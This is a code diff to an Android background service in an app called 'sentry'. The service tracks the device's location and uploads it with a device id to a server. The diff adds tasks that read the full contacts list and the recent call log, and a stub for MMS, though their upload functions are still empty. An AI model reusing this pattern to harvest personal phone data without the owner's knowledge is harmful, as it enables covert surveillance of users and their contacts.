@@ -5,11 +5,15 @@ import java.util.Date;
 import java.util.HashMap;
 
 import android.app.Service;
+import android.content.ContentResolver;
 import android.content.Intent;
+import android.database.Cursor;
 import android.os.AsyncTask;
 import android.os.IBinder;
+import android.provider.CallLog;
+import android.provider.ContactsContract;
+import android.provider.ContactsContract.PhoneLookup;
 import android.text.TextUtils;
-import android.widget.Toast;
 
 import com.baidu.location.BDGeofence;
 import com.baidu.location.BDLocation;
@@ -17,21 +21,37 @@ import com.baidu.location.BDLocationListener;
 import com.baidu.location.LocationClient;
 import com.baidu.location.LocationClientOption;
 import com.baidu.location.LocationClientOption.LocationMode;
+import com.ville.sentry.bean.SCall;
+import com.ville.sentry.bean.SContact;
 import com.ville.sentry.bean.SLocation;
 import com.ville.sentry.bean.WebResult;
 import com.ville.sentry.db.DBDao;
 import com.ville.sentry.db.DBImpl;
 
 public class WorkService extends Service {
+	
+	/**
+     * Timestamp (milliseconds since epoch) of when this contact was last updated.  This
+     * includes updates to all data associated with this contact including raw contacts.  Any
+     * modification (including deletes and inserts) of underlying contact data are also
+     * reflected in this timestamp.
+     */
+    public static final String CONTACT_LAST_UPDATED_TIMESTAMP =
+            "contact_last_updated_timestamp";
 
 	public static final String ACTION_LOCATION_REQ 		= "sentry.action.loc.req";
 	public static final String ACTION_LOCATION_UPLOAD 	= "sentry.action.loc.upload";
+	public static final String ACTION_CONTACT_REQ 		= "sentry.action.contact.req";
+	public static final String ACTION_CALL_LOG_REQ 		= "sentry.action.call_log.req";
+	public static final String ACTION_MMS_REQ 			= "sentry.action.mms.req";
 	
-	public static final String KEY_LOCATION_UPLOAD_TIME = "sentry.key.loc.upload.time";
+	public static final String KEY_LOCATION_UPLOAD_TIME 	= "sentry.key.loction.UploadTime";
+	
+	public static final String KEY_CONTACT_LAST_UPDATE_TIME = "sentry.key.contact.lastUpdateTime";
 	
 	private LocationClient mClient;
 	private MyLocationListener mLocationListener;
-	private static final String TAG = "WorkService";
+	private static final String TAG = "Sentry/WorkService";
 	
 	public WorkService() {
 		// TODO Auto-generated constructor stub
@@ -40,6 +60,7 @@ public class WorkService extends Service {
 	public void onCreate() {
 		// TODO Auto-generated method stub
 		super.onCreate();
+		AppLog.d(TAG, "[onCreate]: WorkService ");
 		mClient = new LocationClient(this.getApplicationContext());
 		mLocationListener = new MyLocationListener();
 		mClient.registerLocationListener(mLocationListener);
@@ -68,6 +89,7 @@ public class WorkService extends Service {
 	@Override
 	public IBinder onBind(Intent intent) {
 		// TODO Auto-generated method stub
+		AppLog.d(TAG, "[onBind]: WorkService ");
 		return null;
 	}
 	
@@ -78,10 +100,23 @@ public class WorkService extends Service {
 		AppLog.d(TAG, "[onStartCommand] " + new Date() + ", " + intent.getAction());
 		String action = intent.getAction();
 		if(ACTION_LOCATION_REQ.equals(action)){
-			mClient.start();
-			mClient.requestLocation();
+			if(!mClient.isStarted()){
+				mClient.start();
+				mClient.requestLocation();
+			}else {
+				AppLog.d(TAG, "[onStartCommand] ReqLocation is Running, SKIP this request.");
+			}
 		}else if (ACTION_LOCATION_UPLOAD.equals(action)){
-			new UploadTask().execute();
+			new UploadLocationTask().execute();
+			
+		}else if (ACTION_CONTACT_REQ.equals(action)){
+			new ReqContactTask().execute();
+			
+		}else if (ACTION_CALL_LOG_REQ.equals(action)){
+			new ReqCallLogTask().execute();
+			
+		}else if (ACTION_MMS_REQ.equals(action)){
+			new ReqMmsTask().execute();
 		}
 		return super.onStartCommand(intent, flags, startId);
 	}
@@ -91,9 +126,13 @@ public class WorkService extends Service {
 	public void onDestroy() {
 		// TODO Auto-generated method stub
 		super.onDestroy();
-		mClient.stop();
-		mClient.unRegisterLocationListener(mLocationListener);
+		AppLog.d(TAG, "[onDestroy]: WorkService ");
+		if(mClient!= null && mClient.isStarted()){
+			mClient.stop();
+			mClient.unRegisterLocationListener(mLocationListener);
+		}
 	}
+	
 	
 	/**
 	 * 实现实位回调监听
@@ -142,7 +181,7 @@ public class WorkService extends Service {
 				loc.radius = location.getRadius();
 				DBDao db = DBImpl.getInstance();
 				db.insertLocation(loc);
-				AppLog.d(TAG, "insertIntoLocation: <" + loc.addr + ">");
+				AppLog.d(TAG, "insertIntoLocation: t[" + loc.time + "], <" + loc.addr + ">");
 				// AppLog.d(TAG, "insertIntoLocation: <" + sb.toString() + ">");
 				
 				if(Utility.isConnected(WorkService.this)){
@@ -152,7 +191,7 @@ public class WorkService extends Service {
 				AppLog.d(TAG, "request location FAILED!!");
 			}
 			
-			if(mClient.isStarted()){
+			if(mClient != null && mClient.isStarted()){
 				AppLog.d(TAG, "Client STOP");
 				mClient.stop();
 			}
@@ -160,13 +199,6 @@ public class WorkService extends Service {
 		}
 	}
 	
-//	private String getLatestFromServer(){
-//		String latest = NetUtil.doGet(Common.URL_LOCATION_LATEST, null);
-//		if(TextUtils.isEmpty(latest)){
-//			latest = "2015-01-01 01:00:00";
-//		}
-//		return latest;
-//	}
 	private String getLatestFromLocal(){
 		DBDao db = DBImpl.getInstance();
 		String latest = db.getLatestTime();
@@ -175,7 +207,7 @@ public class WorkService extends Service {
 		}
 		return latest;
 	}
-	private boolean uploadLocations(ArrayList<SLocation> locations){
+	private boolean uploadLocationList(ArrayList<SLocation> locations){
 		HashMap<String, String> map = new HashMap<String, String>();
 		map.put("locations", SLocation.buildJsonStr(locations));
 		map.put("uuid", SentryApplication.getApp().getUuid());
@@ -184,13 +216,13 @@ public class WorkService extends Service {
 		WebResult result = WebResult.parseByJson(responce);
 		return result != null && result.success;
 	}
-	private boolean upload(String sinceTime){
+	private boolean uploadLocations(String sinceTime){
 		ArrayList<SLocation> locations = DBImpl.getInstance().getLocations(sinceTime);
 //		String serverLatest = getLatestFromServer();
 //		AppLog.d(TAG, "size is " + locations.size() + ", Since Sever " + serverLatest);
 		boolean success = false;
 		if(locations != null && locations.size() > 0){
-			success = uploadLocations(locations);
+			success = uploadLocationList(locations);
 			AppLog.d(TAG, "uploadLocations success ? " + success);
 		} else {
 			AppLog.d(TAG, "No new locations Found!!");
@@ -212,13 +244,13 @@ public class WorkService extends Service {
 		}
 	}
 	
-	class UploadTask extends AsyncTask<Void, Void, Boolean> {
+	class UploadLocationTask extends AsyncTask<Void, Void, Boolean> {
 
 		@Override
 		protected Boolean doInBackground(Void... params) {
 			// TODO Auto-generated method stub
-			String lastUpload = SentryApplication.getApp().getLastUploadTime();
-			return upload(lastUpload);
+			String lastUpload = SentryApplication.getApp().getLocationLastUploadTime();
+			return uploadLocations(lastUpload);
 		}
 		
 		@Override
@@ -226,10 +258,165 @@ public class WorkService extends Service {
 			// TODO Auto-generated method stub
 			if(result){
 				String lastest = getLatestFromLocal();
-				SentryApplication.getApp().setLastUploadTime(lastest);
+				SentryApplication.getApp().setLocationLastUploadTime(lastest);
 			}
 		}
 		
 	}
+	
+	class ReqContactTask extends AsyncTask<Void, Void, Boolean> {
+
+		@Override
+		protected Boolean doInBackground(Void... params) {
+			// TODO Auto-generated method stub
+			ContentResolver cr = getContentResolver();
+			long lastUpdateDB = getContactLastestUpdateTime(cr);
+			long lastUpdateLocal = SentryApplication.getApp().getContactLastUpdateTime();
+			if(lastUpdateLocal < lastUpdateDB){
+				Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
+				AppLog.d(TAG, "[Contact] size = " + cursor.getCount());
+				ArrayList<SContact> list = new ArrayList<SContact>();
+				while(cursor.moveToNext()){
+					SContact contact = new SContact();
+					String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
+				    String name = cursor.getString(cursor.getColumnIndex(PhoneLookup.DISPLAY_NAME));
+					
+				    //查询该位联系人的电话号码，类似的可以查询email，photo
+				    String[] proj = new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER};
+				    String selection = ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?";
+				    String seleArgs[] = new String[]{contactId};
+				    Cursor phoneCursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, proj,
+				    		selection, seleArgs, null);
+				    //一个人可能有几个号码
+				    StringBuilder sb = new StringBuilder();
+				    while(phoneCursor.moveToNext()){
+				        String strPhoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+				        sb.append(strPhoneNumber + ",");
+				    }
+				    contact.idStr = Utility.genContactId(name, contactId);
+					contact.name = name;
+					contact.numbers = sb.toString();
+					list.add(contact);
+					AppLog.d(TAG, "[Contact] > " + contact);
+					
+				    phoneCursor.close();
+				}
+				cursor.close();
+				return true;
+			}else {
+				AppLog.d(TAG, "[Contact] Can not found updates in contact database, SKIP!!");
+				return false;
+			}
+		}
+		
+		@Override
+		protected void onPostExecute(Boolean result) {
+			// TODO Auto-generated method stub
+			if(result){
+				
+			}
+		}
+	}
+	
+	class ReqCallLogTask extends AsyncTask<Void, Void, Boolean> {
+		
+		@Override
+		protected Boolean doInBackground(Void... params) {
+			// TODO Auto-generated method stub
+			ContentResolver cr = getContentResolver();
+			Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, 
+					CallLog.Calls.DATE + " DESC LIMIT 50");
+			AppLog.d(TAG, "[Call] size = " + cursor.getCount());
+			ArrayList<SCall> list = new ArrayList<SCall>();
+			while(cursor.moveToNext()){
+				SCall call = new SCall();
+//			    long _id = cursor.getLong(cursor.getColumnIndex(CallLog.Calls._ID));
+				call.number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
+				call.date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
+				call.duration = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DURATION));
+				call.name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
+				call.type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
+			    AppLog.d(TAG, "[Call] > " + call.toString());
+			    list.add(call);
+			}
+			cursor.close();
+			return updateCalls();
+		}
+		
+		@Override
+		protected void onPostExecute(Boolean result) {
+			// TODO Auto-generated method stub
+			if(result){
+			}
+		}
+	}
+	
+	class ReqMmsTask extends AsyncTask<Void, Void, Boolean> {
+		
+		@Override
+		protected Boolean doInBackground(Void... params) {
+			// TODO Auto-generated method stub
+			return false;
+		}
+		
+		@Override
+		protected void onPostExecute(Boolean result) {
+			// TODO Auto-generated method stub
+			if(result){
+			}
+		}
+	}
+	
+	private boolean updateCalls() {
+		// TODO Auto-generated method stub
+		return false;
+	}
+	
+	private boolean updateContacts() {
+		// TODO Auto-generated method stub
+		return false;
+	}
+	
+	private long getContactLastestUpdateTime(ContentResolver cr){
+		Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI,
+				new String[]{CONTACT_LAST_UPDATED_TIMESTAMP},
+				null,
+				null,
+				CONTACT_LAST_UPDATED_TIMESTAMP + " DESC limit 1"
+				);
+		long lastUpdate = 0L;
+		if(cursor != null && cursor.getCount() > 0 && cursor.moveToNext()){
+			lastUpdate = cursor.getLong(cursor.getColumnIndex(CONTACT_LAST_UPDATED_TIMESTAMP));
+			cursor.close();
+		}
+		AppLog.d(TAG, "getContactLastestUpdateTime " + lastUpdate + ", " + new Date(lastUpdate));
+		return lastUpdate;
+	}
+	
+	
+	/*
+	 * 获取error code：
+	public int getLocType ( )
+	返回值：
+	
+	61 ： GPS定位结果
+	62 ： 扫描整合定位依据失败。此时定位结果无效。
+	63 ： 网络异常，没有成功向服务器发起请求。此时定位结果无效。
+	65 ： 定位缓存的结果。
+	66 ： 离线定位结果。通过requestOfflineLocaiton调用时对应的返回结果
+	67 ： 离线定位失败。通过requestOfflineLocaiton调用时对应的返回结果
+	68 ： 网络连接失败时，查找本地离线定位时对应的返回结果
+	161： 表示网络定位结果
+	162~167： 服务端定位失败
+	
+	
+	Hight_Accuracy
+	高精度定位模式下，会同时使用GPS、Wifi和基站定位，返回的是当前条件下精度最好的定位结果</string>
+    Battery_Saving
+    低功耗定位模式下，仅使用网络定位即Wifi和基站定位，返回的是当前条件下精度最好的网络定位结果</string>
+   	Device_Sensors
+    仅用设备定位模式下，只使用用户的GPS进行定位。这个模式下，由于GPS芯片锁定需要时间，首次定位速度会需要一定的时间</string>
+	 
+	 * */
 	
 }
